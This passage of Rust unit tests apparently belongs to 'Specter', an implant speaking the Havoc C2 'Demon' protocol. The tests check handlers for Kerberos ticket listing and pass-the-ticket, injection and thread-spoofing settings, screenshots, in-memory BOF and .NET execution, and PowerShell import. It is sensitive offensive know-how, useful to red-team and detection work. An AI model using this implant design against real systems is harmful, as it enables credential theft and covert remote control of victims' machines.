        assert_eq!(u32::from_le_bytes(resp.payload[4..8].try_into().unwrap()), 0);
    }

    #[test]
    fn kerberos_luid_response_format() {
        let result = handle_kerberos_luid(0);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandKerberos));
        // Subcmd should be 0.
        assert_eq!(u32::from_le_bytes(resp.payload[0..4].try_into().unwrap()), 0);
        // On non-Windows: [subcmd=0][success=0] → 8 bytes
        #[cfg(not(windows))]
        assert_eq!(resp.payload.len(), 8);
    }

    #[test]
    fn kerberos_klist_all_response_format() {
        // type=0 means /all
        let mut rest = Vec::new();
        rest.extend_from_slice(&0u32.to_le_bytes()); // type = 0 (/all)
        let result = handle_kerberos_klist(1, &rest);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandKerberos));
        // [subcmd=1][success=0] on non-Windows → 8 bytes
        #[cfg(not(windows))]
        assert_eq!(resp.payload.len(), 8);
        assert_eq!(u32::from_le_bytes(resp.payload[0..4].try_into().unwrap()), 1); // subcmd
    }

    #[test]
    fn kerberos_klist_by_luid_response_format() {
        // type=1 means /luid, then a LUID value
        let mut rest = Vec::new();
        rest.extend_from_slice(&1u32.to_le_bytes()); // type = 1 (/luid)
        rest.extend_from_slice(&0x1234u32.to_le_bytes()); // target LUID
        let result = handle_kerberos_klist(1, &rest);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(u32::from_le_bytes(resp.payload[0..4].try_into().unwrap()), 1);
    }

    #[test]
    fn kerberos_klist_missing_luid_ignored() {
        // type=1 but no LUID value → parse error → Ignore
        let rest = 1u32.to_le_bytes().to_vec(); // type = 1 (/luid), no LUID
        let result = handle_kerberos_klist(1, &rest);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn kerberos_purge_response_format() {
        let rest = 0xABCDu32.to_le_bytes().to_vec();
        let result = handle_kerberos_purge(2, &rest);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(u32::from_le_bytes(resp.payload[0..4].try_into().unwrap()), 2); // subcmd
        // On non-Windows: success = 0
        #[cfg(not(windows))]
        assert_eq!(u32::from_le_bytes(resp.payload[4..8].try_into().unwrap()), 0);
    }

    #[test]
    fn kerberos_purge_missing_luid_ignored() {
        let result = handle_kerberos_purge(2, &[]);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn kerberos_ptt_response_format() {
        let ticket = vec![0x61, 0x82, 0x03, 0x00];
        let luid: u32 = 0x5678;
        let mut rest = Vec::new();
        // Length-prefixed ticket bytes.
        rest.extend_from_slice(&(ticket.len() as u32).to_le_bytes());
        rest.extend_from_slice(&ticket);
        rest.extend_from_slice(&luid.to_le_bytes());
        let result = handle_kerberos_ptt(3, &rest);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(u32::from_le_bytes(resp.payload[0..4].try_into().unwrap()), 3); // subcmd
        // On non-Windows: success = 0
        #[cfg(not(windows))]
        assert_eq!(u32::from_le_bytes(resp.payload[4..8].try_into().unwrap()), 0);
    }

    #[test]
    fn kerberos_ptt_missing_ticket_ignored() {
        let result = handle_kerberos_ptt(3, &[]);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn kerberos_ptt_missing_luid_after_ticket_ignored() {
        // Valid ticket but no LUID after it.
        let mut rest = Vec::new();
        rest.extend_from_slice(&2u32.to_le_bytes()); // ticket length = 2
        rest.extend_from_slice(&[0xAA, 0xBB]); // ticket data
        // No LUID following → parse error.
        let result = handle_kerberos_ptt(3, &rest);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn kerberos_unknown_subcommand_ignored() {
        let payload = kerberos_payload(99, &[]); // invalid subcmd
        let result = handle_kerberos(&payload);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn kerberos_empty_payload_ignored() {
        let result = handle_kerberos(&[]);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── CommandConfig tests ───────────────────────────────────────────────────

    /// Build a config payload: `[key: u32 LE][extra…]`
    fn config_payload(key: u32, extra: &[u8]) -> Vec<u8> {
        let mut v = key.to_le_bytes().to_vec();
        v.extend_from_slice(extra);
        v
    }

    /// Parse a LE u32 from a response payload at the given byte offset.
    fn resp_u32(payload: &[u8], byte_offset: usize) -> u32 {
        u32::from_le_bytes(payload[byte_offset..byte_offset + 4].try_into().unwrap())
    }

    /// Parse a LE u64 from a response payload at the given byte offset.
    fn resp_u64(payload: &[u8], byte_offset: usize) -> u64 {
        u64::from_le_bytes(payload[byte_offset..byte_offset + 8].try_into().unwrap())
    }

    #[test]
    fn config_empty_payload_ignored() {
        let mut config = SpecterConfig::default();
        let result = handle_config(&[], &mut config);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn config_unknown_key_ignored() {
        let mut config = SpecterConfig::default();
        let payload = config_payload(9999, &[]);
        let result = handle_config(&payload, &mut config);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn config_implant_verbose_sets_flag() {
        let mut config = SpecterConfig::default();
        assert!(!config.verbose);

        let extra = 1u32.to_le_bytes();
        let payload = config_payload(u32::from(DemonConfigKey::ImplantVerbose), &extra);
        let result = handle_config(&payload, &mut config);

        assert!(config.verbose);
        let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandConfig));
        assert_eq!(resp_u32(&resp.payload, 0), u32::from(DemonConfigKey::ImplantVerbose));
        assert_eq!(resp_u32(&resp.payload, 4), 1);
    }

    #[test]
    fn config_implant_verbose_zero_clears_flag() {
        let mut config = SpecterConfig { verbose: true, ..Default::default() };

        let extra = 0u32.to_le_bytes();
        let payload = config_payload(u32::from(DemonConfigKey::ImplantVerbose), &extra);
        handle_config(&payload, &mut config);
        assert!(!config.verbose);
    }

    #[test]
    fn config_sleep_technique_updates() {
        let mut config = SpecterConfig::default();
        let extra = 3u32.to_le_bytes();
        let payload = config_payload(u32::from(DemonConfigKey::ImplantSleepTechnique), &extra);
        let result = handle_config(&payload, &mut config);

        assert_eq!(config.sleep_technique, 3);
        let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
        assert_eq!(resp_u32(&resp.payload, 0), u32::from(DemonConfigKey::ImplantSleepTechnique));
        assert_eq!(resp_u32(&resp.payload, 4), 3);
    }

    #[test]
    fn config_coffee_threaded_updates() {
        let mut config = SpecterConfig::default();
        let extra = 1u32.to_le_bytes();
        let payload = config_payload(u32::from(DemonConfigKey::ImplantCoffeeThreaded), &extra);
        handle_config(&payload, &mut config);
        assert!(config.coffee_threaded);
    }

    #[test]
    fn config_coffee_veh_updates() {
        let mut config = SpecterConfig::default();
        let extra = 1u32.to_le_bytes();
        let payload = config_payload(u32::from(DemonConfigKey::ImplantCoffeeVeh), &extra);
        handle_config(&payload, &mut config);
        assert!(config.coffee_veh);
    }

    #[test]
    fn config_memory_alloc_updates() {
        let mut config = SpecterConfig::default();
        let extra = 42u32.to_le_bytes();
        let payload = config_payload(u32::from(DemonConfigKey::MemoryAlloc), &extra);
        let result = handle_config(&payload, &mut config);

        assert_eq!(config.memory_alloc, 42);
        let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
        assert_eq!(resp_u32(&resp.payload, 4), 42);
    }

    #[test]
    fn config_memory_execute_updates() {
        let mut config = SpecterConfig::default();
        let extra = 7u32.to_le_bytes();
        let payload = config_payload(u32::from(DemonConfigKey::MemoryExecute), &extra);
        handle_config(&payload, &mut config);
        assert_eq!(config.memory_execute, 7);
    }

    #[test]
    fn config_inject_technique_updates() {
        let mut config = SpecterConfig::default();
        let extra = 5u32.to_le_bytes();
        let payload = config_payload(u32::from(DemonConfigKey::InjectTechnique), &extra);
        handle_config(&payload, &mut config);
        assert_eq!(config.inject_technique, 5);
    }

    #[test]
    fn config_killdate_sets_timestamp() {
        let mut config = SpecterConfig::default();
        let ts: u64 = 1_700_000_000;
        let extra = ts.to_le_bytes();
        let payload = config_payload(u32::from(DemonConfigKey::KillDate), &extra);
        let result = handle_config(&payload, &mut config);

        assert_eq!(config.kill_date, Some(ts as i64));
        let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
        assert_eq!(resp_u32(&resp.payload, 0), u32::from(DemonConfigKey::KillDate));
        assert_eq!(resp_u64(&resp.payload, 4), ts);
    }

    #[test]
    fn config_killdate_zero_clears() {
        let mut config = SpecterConfig { kill_date: Some(123), ..Default::default() };
        let extra = 0u64.to_le_bytes();
        let payload = config_payload(u32::from(DemonConfigKey::KillDate), &extra);
        handle_config(&payload, &mut config);
        assert_eq!(config.kill_date, None);
    }

    #[test]
    fn config_killdate_missing_value_ignored() {
        let mut config = SpecterConfig::default();
        let payload = config_payload(u32::from(DemonConfigKey::KillDate), &[]);
        let result = handle_config(&payload, &mut config);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn config_working_hours_updates() {
        let mut config = SpecterConfig::default();
        let extra = 0x00FF_FF00u32.to_le_bytes();
        let payload = config_payload(u32::from(DemonConfigKey::WorkingHours), &extra);
        handle_config(&payload, &mut config);
        assert_eq!(config.working_hours, Some(0x00FF_FF00u32 as i32));
    }

    #[test]
    fn config_spf_thread_addr_updates() {
        let mut config = SpecterConfig::default();
        // Build: [key][lib_len][lib_bytes\0][func_len][func_bytes\0][offset]
        let lib = b"ntdll.dll\0";
        let func = b"RtlUserThreadStart\0";
        let mut extra = Vec::new();
        extra.extend_from_slice(&(lib.len() as u32).to_le_bytes());
        extra.extend_from_slice(lib);
        extra.extend_from_slice(&(func.len() as u32).to_le_bytes());
        extra.extend_from_slice(func);
        extra.extend_from_slice(&0x10u32.to_le_bytes());
        let payload = config_payload(u32::from(DemonConfigKey::ImplantSpfThreadStart), &extra);
        let result = handle_config(&payload, &mut config);

        assert_eq!(
            config.spf_thread_addr,
            Some(("ntdll.dll".to_string(), "RtlUserThreadStart".to_string(), 0x10))
        );
        let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
        assert_eq!(resp_u32(&resp.payload, 0), u32::from(DemonConfigKey::ImplantSpfThreadStart));
    }

    #[test]
    fn config_inject_spoof_addr_updates() {
        let mut config = SpecterConfig::default();
        let lib = b"kernel32.dll\0";
        let func = b"CreateThread\0";
        let mut extra = Vec::new();
        extra.extend_from_slice(&(lib.len() as u32).to_le_bytes());
        extra.extend_from_slice(lib);
        extra.extend_from_slice(&(func.len() as u32).to_le_bytes());
        extra.extend_from_slice(func);
        extra.extend_from_slice(&0x20u32.to_le_bytes());
        let payload = config_payload(u32::from(DemonConfigKey::InjectSpoofAddr), &extra);
        handle_config(&payload, &mut config);

        assert_eq!(
            config.inject_spoof_addr,
            Some(("kernel32.dll".to_string(), "CreateThread".to_string(), 0x20))
        );
    }

    #[test]
    fn config_addr_missing_function_ignored() {
        let mut config = SpecterConfig::default();
        let lib = b"ntdll.dll\0";
        let mut extra = Vec::new();
        extra.extend_from_slice(&(lib.len() as u32).to_le_bytes());
        extra.extend_from_slice(lib);
        // No function or offset follows.
        let payload = config_payload(u32::from(DemonConfigKey::ImplantSpfThreadStart), &extra);
        let result = handle_config(&payload, &mut config);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn config_spawn64_updates() {
        let mut config = SpecterConfig::default();
        // The server sends the path as length-prefixed UTF-16LE bytes.
        let path_str = "C:\\Windows\\System32\\notepad.exe";
        let utf16: Vec<u8> = path_str
            .encode_utf16()
            .chain(std::iter::once(0u16))
            .flat_map(|c| c.to_le_bytes())
            .collect();
        let mut extra = Vec::new();
        extra.extend_from_slice(&(utf16.len() as u32).to_le_bytes());
        extra.extend_from_slice(&utf16);
        let payload = config_payload(u32::from(DemonConfigKey::InjectSpawn64), &extra);
        let result = handle_config(&payload, &mut config);

        assert_eq!(config.spawn64.as_deref(), Some(path_str));
        let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
        assert_eq!(resp_u32(&resp.payload, 0), u32::from(DemonConfigKey::InjectSpawn64));
    }

    #[test]
    fn config_spawn32_updates() {
        let mut config = SpecterConfig::default();
        let path_str = "C:\\Windows\\SysWOW64\\cmd.exe";
        let utf16: Vec<u8> = path_str
            .encode_utf16()
            .chain(std::iter::once(0u16))
            .flat_map(|c| c.to_le_bytes())
            .collect();
        let mut extra = Vec::new();
        extra.extend_from_slice(&(utf16.len() as u32).to_le_bytes());
        extra.extend_from_slice(&utf16);
        let payload = config_payload(u32::from(DemonConfigKey::InjectSpawn32), &extra);
        handle_config(&payload, &mut config);

        assert_eq!(config.spawn32.as_deref(), Some(path_str));
    }

    #[test]
    fn config_spawn_missing_bytes_ignored() {
        let mut config = SpecterConfig::default();
        let payload = config_payload(u32::from(DemonConfigKey::InjectSpawn64), &[]);
        let result = handle_config(&payload, &mut config);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn config_u32_missing_value_ignored() {
        let mut config = SpecterConfig::default();
        // Key with no value bytes.
        let payload = config_payload(u32::from(DemonConfigKey::MemoryAlloc), &[]);
        let result = handle_config(&payload, &mut config);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn config_dispatch_routes_correctly() {
        let extra = 1u32.to_le_bytes();
        let inner = config_payload(u32::from(DemonConfigKey::ImplantVerbose), &extra);
        let pkg = DemonPackage {
            command_id: u32::from(DemonCommand::CommandConfig),
            request_id: 42,
            payload: inner,
        };
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::default();
        let mut mem_files = MemFileStore::new();
        let result = dispatch(
            &pkg,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut mem_files,
            &mut JobStore::new(),
            &mut Vec::new(),
        );

        assert!(config.verbose);
        let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandConfig));
    }

    // ── CommandScreenshot (2510) ────────────────────────────────────────────

    #[test]
    fn screenshot_returns_respond_with_correct_command_id() {
        let result = handle_screenshot();
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandScreenshot));
    }

    #[test]
    fn screenshot_response_starts_with_success_flag() {
        let result = handle_screenshot();
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        // On non-Windows (CI) the stub returns None → success=0.
        // On Windows the GDI call should succeed → success=1.
        assert!(resp.payload.len() >= 4, "payload must contain at least the success flag");
        let success = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
        if cfg!(windows) {
            assert_eq!(success, 1, "screenshot must succeed on Windows");
            // Verify the image bytes are present after the success flag.
            assert!(resp.payload.len() > 8, "payload must contain image data");
            let img_len = u32::from_le_bytes(resp.payload[4..8].try_into().unwrap());
            assert!(img_len > 0, "image length must be non-zero");
            assert_eq!(
                resp.payload.len(),
                8 + img_len as usize,
                "payload length must match header + image bytes"
            );
            // BMP magic: first two bytes of image data should be 'BM'.
            assert_eq!(resp.payload[8], b'B', "BMP magic byte 0");
            assert_eq!(resp.payload[9], b'M', "BMP magic byte 1");
        } else {
            assert_eq!(success, 0, "screenshot must fail on non-Windows stub");
            assert_eq!(resp.payload.len(), 4, "failure payload is just the flag");
        }
    }

    #[test]
    fn screenshot_dispatch_routes_correctly() {
        let pkg = DemonPackage {
            command_id: u32::from(DemonCommand::CommandScreenshot),
            request_id: 99,
            payload: Vec::new(),
        };
        let mut config = SpecterConfig::default();
        let mut vault = TokenVault::new();
        let mut downloads = DownloadTracker::default();
        let mut mem_files = MemFileStore::new();
        let result = dispatch(
            &pkg,
            &mut config,
            &mut vault,
            &mut downloads,
            &mut mem_files,
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandScreenshot));
    }

    // ── CommandInlineExecute (20) ───────────────────────────────────────────

    #[test]
    fn inline_execute_short_payload_returns_could_not_run() {
        let result = handle_inline_execute(&[], &SpecterConfig::default(), &mut HashMap::new());
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandInlineExecute));
        // Payload should start with BOF_COULD_NOT_RUN (4)
        let cb_type = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
        assert_eq!(cb_type, coffeeldr::BOF_COULD_NOT_RUN);
    }

    #[test]
    fn inline_execute_missing_memfile_returns_could_not_run() {
        // Valid payload structure but memfile IDs don't exist
        let mut payload = Vec::new();
        // function_name: "go"
        let func = b"go\0";
        payload.extend_from_slice(&(func.len() as u32).to_le_bytes());
        payload.extend_from_slice(func);
        // bof_file_id
        payload.extend_from_slice(&99u32.to_le_bytes());
        // params_file_id
        payload.extend_from_slice(&100u32.to_le_bytes());
        // flags
        payload.extend_from_slice(&0u32.to_le_bytes());

        let result =
            handle_inline_execute(&payload, &SpecterConfig::default(), &mut HashMap::new());
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandInlineExecute));
        let cb_type = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
        assert_eq!(cb_type, coffeeldr::BOF_COULD_NOT_RUN);
    }

    #[test]
    fn inline_execute_incomplete_memfile_returns_could_not_run() {
        let mut mem_files = MemFileStore::new();
        // Insert an incomplete memfile
        mem_files.insert(1, MemFile { expected_size: 100, data: vec![0u8; 50] });

        let mut payload = Vec::new();
        let func = b"go\0";
        payload.extend_from_slice(&(func.len() as u32).to_le_bytes());
        payload.extend_from_slice(func);
        payload.extend_from_slice(&1u32.to_le_bytes()); // bof_file_id
        payload.extend_from_slice(&2u32.to_le_bytes()); // params_file_id
        payload.extend_from_slice(&0u32.to_le_bytes()); // flags

        let result = handle_inline_execute(&payload, &SpecterConfig::default(), &mut mem_files);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        let cb_type = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
        assert_eq!(cb_type, coffeeldr::BOF_COULD_NOT_RUN);
        // Memfiles should be cleaned up
        assert!(!mem_files.contains_key(&1));
    }

    #[test]
    fn inline_execute_with_valid_memfiles_attempts_execution() {
        let mut mem_files = MemFileStore::new();
        // Insert complete memfiles (garbage COFF data — execution will fail)
        mem_files.insert(1, MemFile { expected_size: 4, data: vec![0xDE, 0xAD, 0xBE, 0xEF] });
        mem_files.insert(2, MemFile { expected_size: 0, data: Vec::new() });

        let mut payload = Vec::new();
        let func = b"go\0";
        payload.extend_from_slice(&(func.len() as u32).to_le_bytes());
        payload.extend_from_slice(func);
        payload.extend_from_slice(&1u32.to_le_bytes());
        payload.extend_from_slice(&2u32.to_le_bytes());
        payload.extend_from_slice(&0u32.to_le_bytes());

        let result = handle_inline_execute(&payload, &SpecterConfig::default(), &mut mem_files);
        // Should get some kind of response (BOF_COULD_NOT_RUN on invalid COFF)
        match result {
            DispatchResult::Respond(resp) => {
                assert_eq!(resp.command_id, u32::from(DemonCommand::CommandInlineExecute));
            }
            DispatchResult::MultiRespond(resps) => {
                assert!(!resps.is_empty());
                assert_eq!(resps[0].command_id, u32::from(DemonCommand::CommandInlineExecute));
            }
            _ => panic!("expected Respond or MultiRespond"),
        }
        // Memfiles should be cleaned up
        assert!(!mem_files.contains_key(&1));
        assert!(!mem_files.contains_key(&2));
    }

    // ── CommandJob (21) ─────────────────────────────────────────────────────

    #[test]
    fn job_list_empty_store_returns_header_only() {
        let mut store = JobStore::new();
        let payload = 1u32.to_le_bytes().to_vec(); // List = 1
        let result = handle_job(&payload, &mut store);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandJob));
        // Payload: [1: u32 LE] — just the subcommand, no jobs
        assert_eq!(resp.payload.len(), 4);
        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
        assert_eq!(subcmd, 1);
    }

    #[test]
    fn job_list_with_jobs_includes_all_entries() {
        let mut store = JobStore::new();
        store.add(crate::job::JOB_TYPE_THREAD, 0);
        store.add(crate::job::JOB_TYPE_PROCESS, 0);

        let payload = 1u32.to_le_bytes().to_vec();
        let result = handle_job(&payload, &mut store);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        // Payload: [1: u32] + 2 * [job_id: u32, type: u32, state: u32] = 4 + 24 = 28
        assert_eq!(resp.payload.len(), 28);
    }

    #[test]
    fn job_suspend_nonexistent_returns_failure() {
        let mut store = JobStore::new();
        let mut payload = Vec::new();
        payload.extend_from_slice(&2u32.to_le_bytes()); // Suspend = 2
        payload.extend_from_slice(&999u32.to_le_bytes()); // nonexistent job
        let result = handle_job(&payload, &mut store);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        // [2: u32][999: u32][0: u32 (false)]
        assert_eq!(resp.payload.len(), 12);
        let success = u32::from_le_bytes(resp.payload[8..12].try_into().expect("u32"));
        assert_eq!(success, 0);
    }

    #[test]
    fn job_kill_existing_returns_success() {
        let mut store = JobStore::new();
        let id = store.add(crate::job::JOB_TYPE_THREAD, 0);
        let mut payload = Vec::new();
        payload.extend_from_slice(&4u32.to_le_bytes()); // KillRemove = 4
        payload.extend_from_slice(&id.to_le_bytes());
        let result = handle_job(&payload, &mut store);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        let success = u32::from_le_bytes(resp.payload[8..12].try_into().expect("u32"));
        assert_eq!(success, 1);
    }

    #[test]
    fn job_unknown_subcommand_returns_ignore() {
        let mut store = JobStore::new();
        let payload = 99u32.to_le_bytes().to_vec();
        let result = handle_job(&payload, &mut store);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn job_short_payload_returns_ignore() {
        let mut store = JobStore::new();
        let result = handle_job(&[0x01], &mut store);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── CommandPsImport (0x1011) ────────────────────────────────────────────

    #[test]
    fn ps_import_stores_script_and_responds_success() {
        let mut ps_scripts = PsScriptStore::new();
        let mut mem_files = MemFileStore::new();

        // Stage script in memfile
        let script = b"Write-Host 'Hello'";
        mem_files.insert(42, MemFile { expected_size: script.len(), data: script.to_vec() });

        let payload = 42u32.to_le_bytes().to_vec(); // memfile ID
        let result = handle_ps_import(&payload, &mut ps_scripts, &mut mem_files);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandPsImport));
        assert_eq!(ps_scripts, script.to_vec());
        // Response should contain empty string (success)
        let out_len = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
        assert_eq!(out_len, 0);
    }

    #[test]
    fn ps_import_missing_memfile_uses_raw_payload() {
        let mut ps_scripts = PsScriptStore::new();
        let mut mem_files = MemFileStore::new();

        // Payload: [memfile_id: u32][raw script bytes]
        let mut payload = Vec::new();
        payload.extend_from_slice(&99u32.to_le_bytes()); // nonexistent memfile
        payload.extend_from_slice(b"Get-Process");

        let result = handle_ps_import(&payload, &mut ps_scripts, &mut mem_files);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandPsImport));
        assert_eq!(ps_scripts, b"Get-Process".to_vec());
    }

    #[test]
    fn ps_import_empty_script_returns_error() {
        let mut ps_scripts = PsScriptStore::new();
        let mut mem_files = MemFileStore::new();
        mem_files.insert(1, MemFile { expected_size: 0, data: Vec::new() });

        let payload = 1u32.to_le_bytes().to_vec();
        let result = handle_ps_import(&payload, &mut ps_scripts, &mut mem_files);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        // Should contain non-empty error message
        let out_len = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
        assert!(out_len > 0);
    }

    // ── CommandAssemblyInlineExecute (0x2001) ───────────────────────────────

    #[test]
    fn assembly_inline_execute_short_payload_returns_failed() {
        let result = handle_assembly_inline_execute(&[], &mut HashMap::new());
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandAssemblyInlineExecute));
        let info_id = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
        assert_eq!(info_id, dotnet::DOTNET_INFO_FAILED);
    }

    #[test]
    fn assembly_inline_execute_missing_memfile_returns_failed() {
        let mut mem_files = MemFileStore::new();

        // Build payload with valid wstrings but nonexistent memfile
        let mut payload = Vec::new();
        // pipe_name
        let pipe_utf16: Vec<u8> = "pipe"
            .encode_utf16()
            .chain(std::iter::once(0u16))
            .flat_map(|c| c.to_le_bytes())
            .collect();
        payload.extend_from_slice(&(pipe_utf16.len() as u32).to_le_bytes());
        payload.extend_from_slice(&pipe_utf16);
        // app_domain
        let domain_utf16: Vec<u8> = "dom"
            .encode_utf16()
            .chain(std::iter::once(0u16))
            .flat_map(|c| c.to_le_bytes())
            .collect();
        payload.extend_from_slice(&(domain_utf16.len() as u32).to_le_bytes());
        payload.extend_from_slice(&domain_utf16);
        // net_version
        let ver_utf16: Vec<u8> = "v4.0"
            .encode_utf16()
            .chain(std::iter::once(0u16))
            .flat_map(|c| c.to_le_bytes())
            .collect();
        payload.extend_from_slice(&(ver_utf16.len() as u32).to_le_bytes());
        payload.extend_from_slice(&ver_utf16);
        // memfile_id (nonexistent)
        payload.extend_from_slice(&999u32.to_le_bytes());

        let result = handle_assembly_inline_execute(&payload, &mut mem_files);
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        let info_id = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
        assert_eq!(info_id, dotnet::DOTNET_INFO_FAILED);
    }

    // ── CommandAssemblyListVersions (0x2003) ────────────────────────────────

    #[test]
    fn assembly_list_versions_returns_respond() {
        let result = handle_assembly_list_versions();
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandAssemblyListVersions));
        // On non-Windows, payload will be empty (no CLR versions)
        #[cfg(not(windows))]
        assert_eq!(resp.payload.len(), 0);
    }

    // ── Full dispatch routing tests for new commands ────────────────────────

    #[test]
    fn dispatch_routes_command_job() {
        let mut config = SpecterConfig::default();
        let payload = 1u32.to_le_bytes().to_vec(); // List
        let package = DemonPackage::new(DemonCommand::CommandJob, 1, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandJob));
    }

    #[test]
    fn dispatch_routes_command_assembly_list_versions() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandAssemblyListVersions, 1, Vec::new());
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandAssemblyListVersions));
    }

    // ── CommandPackageDropped ────────────────────────────────────────────────

    #[test]
    fn dispatch_routes_package_dropped_returns_ignore() {
        let mut config = SpecterConfig::default();
        let payload = le_u32_pair(0x20000, 0x10000); // dropped=128KB, max=64KB
        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 42, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
    }

    #[test]
    fn package_dropped_marks_matching_downloads_for_removal() {
        let mut config = SpecterConfig::default();
        let mut downloads = DownloadTracker::new();

        // Create a temp file to register as a download.
        let dir = std::env::temp_dir();
        let path = dir.join(format!("specter_pkg_drop_{}", rand::random::<u32>()));
        std::fs::write(&path, b"data").expect("write temp");
        let file = std::fs::File::open(&path).expect("open temp");
        let file_id = downloads.add(file, 99, 4); // request_id=99

        let payload = le_u32_pair(0x20000, 0x10000);
        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 99, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut downloads,
            &mut HashMap::new(),
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Ignore));

        // The download should now be marked for removal.
        let entry = downloads.get(file_id).expect("entry should still exist before push");
        assert_eq!(entry.state, DownloadState::Remove);
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn package_dropped_removes_matching_memfile() {
        let mut config = SpecterConfig::default();
        let mut mem_files: MemFileStore = HashMap::new();
        mem_files.insert(55, MemFile { expected_size: 1024, data: vec![0u8; 512] });

        let payload = le_u32_pair(0x20000, 0x10000);
        let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 55, payload);
        let result = dispatch(
            &package,
            &mut config,
            &mut TokenVault::new(),
            &mut DownloadTracker::new(),
            &mut mem_files,
            &mut JobStore::new(),
            &mut Vec::new(),
        );
        assert!(matches!(result, DispatchResult::Ignore));
        assert!(mem_files.get(&55).is_none(), "mem-file should have been removed");
    }

    #[test]
    fn package_dropped_ignores_short_payload() {
        let mut config = SpecterConfig::default();
        let payload = vec![0x00, 0x01, 0x00]; // only 3 bytes, not enough for two u32s
